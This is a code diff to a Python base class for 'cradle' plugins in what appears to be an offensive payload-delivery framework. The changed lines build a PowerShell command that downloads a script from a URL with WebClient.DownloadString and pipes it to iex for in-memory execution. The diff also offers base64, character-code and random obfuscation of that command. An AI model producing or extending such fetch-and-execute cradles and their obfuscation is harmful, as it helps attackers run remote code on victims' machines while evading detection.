@@ -13,12 +13,12 @@ class BaseCradlePlugin(ABC):
     
     OPTIONS: Dict[str, Dict[str, Any]] = {
         "CONTENT_OBFUSCATION": {
-            "description": "Payload obfuscation applied by the core before serving: none | base64 | char | getrandom",
+            "description": "Payload obfuscation applied by the core before serving",
             "default": "getrandom",
             "restricted_to": ["none","base64","char","getrandom"]
         },
         "CRADLE_OBFUSCATION": {
-            "description": "Cradle command obfuscation applied by the core before serving: none | base64 | char | getrandom",
+            "description": "Cradle command obfuscation applied by the core before serving",
             "default": "getrandom",
             "restricted_to": ["none","base64","char","getrandom"]
         },
@@ -36,16 +36,17 @@ class BaseCradlePlugin(ABC):
         """Return the raw cradle payload as a string (no encoding applied)."""
         pass
 
+
     def cradle_command(self, inst: CradleInstance, cradle_url: str) -> str:
         obs_cradle = inst.options.get("CRADLE_OBFUSCATION","none").lower()
-        cradle = f".((New-Object System.Net.WebClient).DownloadString({cradle_url}));"
+        cradle = f"(New-Object System.Net.WebClient).DownloadString(\"{cradle_url}\")|iex"
 
         if obs_cradle == "base64":
             return f".([System.Text.Encoding]::UTF8::GetString([System.Convert]::FromBase64String({base64.b64encode(cradle.encode("utf-16-le")).decode()})));"
         elif obs_cradle == "char":
             return f".(-join({[f"[char]{ord(c)}" for c in list(cradle)]}));"
         elif obs_cradle == "getrandom":
-            return f".({sgr(cradle)});"
+            return f"({sgr(cradle)})|iex"
         return f"{cradle}"
     
     def notification_callback_snippet(self, inst: CradleInstance, header_var_dict: dict) -> str:
